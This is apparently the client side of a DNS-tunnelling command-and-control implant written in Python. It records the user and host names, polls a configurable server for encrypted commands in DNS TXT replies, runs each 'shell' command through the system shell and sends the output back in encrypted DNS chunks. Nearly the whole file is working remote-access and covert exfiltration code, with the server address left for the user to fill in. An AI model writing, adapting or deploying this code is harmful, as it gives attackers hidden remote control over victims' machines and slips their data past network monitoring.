import socket
import base64
import time
import subprocess
from dnslib import DNSRecord, QTYPE, RR, TXT
import os
from encrypt import encrypt_message, decrypt_message

DNS_SERVER = "127.0.0.1"  # Change to your server's IP
DNS_PORT = 9053
POLL_INTERVAL = 2
MAX_CHUNK_SIZE = 200  # Reduced chunk size to stay within DNS limits
MAX_OUTPUT_SIZE = 5000  # Limit total output size to 5000 characters
SECRET_KEY = b'' # Generate a secret with `secrets.token_bytes(32)` and replace it in the agent and server script

user = subprocess.check_output("whoami", shell=True).decode().strip()
host = subprocess.check_output("hostname", shell=True).decode().strip()
CLIENT_ID = f"agent-{user}@{host}"  # Unique ID for this agent


def send_dns_query(server, query_name, txt_data=""):
    """Send a DNS query with optional TXT data."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)

    request = DNSRecord.question(query_name, qtype="TXT")
    if txt_data:
        request.add_answer(RR(query_name, QTYPE.TXT, rdata=TXT(txt_data), ttl=60))

    sock.sendto(request.pack(), (server, DNS_PORT))

    try:
        data, _ = sock.recvfrom(512)
        response = DNSRecord.parse(data)
        return [str(record.rdata).strip('"') for record in response.rr]
    except socket.timeout:
        return []
    finally:
        sock.close()


def send_output_chunks(output):
    """Split, encrypt, and send output in chunks."""
    if len(output) > MAX_OUTPUT_SIZE:
        output = output[:MAX_OUTPUT_SIZE] + "\n[OUTPUT TRUNCATED]"

    encrypted_output = encrypt_message(output, SECRET_KEY)
    chunks = [encrypted_output[i:i + MAX_CHUNK_SIZE] for i in range(0, len(encrypted_output), MAX_CHUNK_SIZE)]

    # Send each chunk using output.<index> queries
    for i, chunk in enumerate(chunks):
        query_name = f"output.{CLIENT_ID}.{i}"
        response = send_dns_query(DNS_SERVER, query_name, txt_data=chunk)
        if "RECEIVED" not in response:
            print(f"Failed to send output chunk {i}")
            return

    # Notify the server that all chunks have been sent
    send_dns_query(DNS_SERVER, f"output.{CLIENT_ID}.END")


def handshake():
    """Perform a handshake with the server to establish a session."""
    response = send_dns_query(DNS_SERVER, f"handshake.{CLIENT_ID}")
    if "HANDSHAKE_OK" in response:
        print("Handshake successful.")
    else:
        print("Handshake failed.")
        exit(1)


def main():
    print("Client started. Polling for commands...")
    handshake()

    while True:
        try:
            response = send_dns_query(DNS_SERVER, f"poll.{CLIENT_ID}")
            if not response or response[0] == "NO_CMD":
                time.sleep(POLL_INTERVAL)
                continue

            encrypted_command = "".join(response)
            command = decrypt_message(encrypted_command, SECRET_KEY)
            print(f"Received command: {command}")

            if command.startswith("shell "):
                process = subprocess.Popen(command[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()

                # Combine stdout and stderr to capture all output
                cmd_output = (stdout + stderr).decode("latin")

                # Optional: Include the exit status for debugging purposes
                exit_code = process.returncode
                cmd_output += f"\n[Exit Code: {exit_code}]"
                send_output_chunks(cmd_output)
        except Exception as e:
            print(f"Error: {e}")

        time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    main()
